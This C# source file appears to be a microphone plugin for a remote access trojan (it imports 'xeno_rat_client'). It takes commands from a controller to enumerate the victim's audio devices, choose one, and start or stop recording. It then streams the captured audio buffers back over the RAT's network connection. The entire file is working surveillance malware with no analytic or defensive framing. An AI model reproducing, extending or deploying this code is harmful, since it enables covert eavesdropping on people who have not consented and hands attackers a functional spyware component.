using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using xeno_rat_client;
using NAudio.Wave;
using System.Threading;
using System.Net.Sockets;

namespace Plugin
{
    public class Main
    {
        WaveInEvent waveIn = new WaveInEvent();
        bool playing = false;
        Node MicNode;
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            try
            {
                waveIn.WaveFormat = new WaveFormat(44100, 16, 2);
                waveIn.DataAvailable += async (sender, e) =>
                {
                    if (playing)
                    {
                        if (MicNode != null)
                        {
                            await MicNode.SendAsync(e.Buffer);
                        }
                    }

                };
                await recvThread(node);
                waveIn.Dispose();
                MicNode.Disconnect();
            }
            catch 
            {
                node.Disconnect();
                MicNode?.Disconnect();
                waveIn?.Dispose();
            }
        }
        public async Task recvThread(Node node) 
        {
            while (node.Connected())
            {
                byte[] data = await node.ReceiveAsync();
                if (data == null) 
                {
                    waveIn.Dispose();
                    MicNode.Disconnect();
                    break;
                }
                if (data[0] == 1)
                {
                    await node.SendAsync(node.sock.IntToBytes(WaveInEvent.DeviceCount));
                    for (int i = 0; i < WaveInEvent.DeviceCount; i++)
                    {
                        var deviceInfo = WaveInEvent.GetCapabilities(i);
                        await node.SendAsync(Encoding.UTF8.GetBytes(deviceInfo.ProductName));
                    }
                }
                else if (data[0] == 2)
                {
                    waveIn.DeviceNumber = node.sock.BytesToInt(await node.ReceiveAsync());
                }
                else if (data[0] == 3)
                {
                    playing = true;
                    waveIn.StartRecording();
                }
                else if (data[0] == 4)
                {
                    playing = false;
                    waveIn.StopRecording();
                }
                else if (data[0] == 5) 
                {
                    byte[] id = await node.ReceiveAsync();
                    if (id != null)
                    {
                        int nodeid = node.sock.BytesToInt(id);
                        Node tempnode = null;
                        foreach (Node i in node.Parent.subNodes)
                        {
                            if (i.SetId == nodeid)
                            {
                                await node.SendAsync(new byte[] { 1 });
                                tempnode = i;
                                break;
                            }
                        }
                        if (tempnode == null)
                        {
                            await node.SendAsync(new byte[] { 0 });
                            continue;
                        }
                        node.AddSubNode(tempnode);
                        MicNode = tempnode;
                    }
                    else
                    {
                        break;
                    }
                }
            }
        }
    }

}
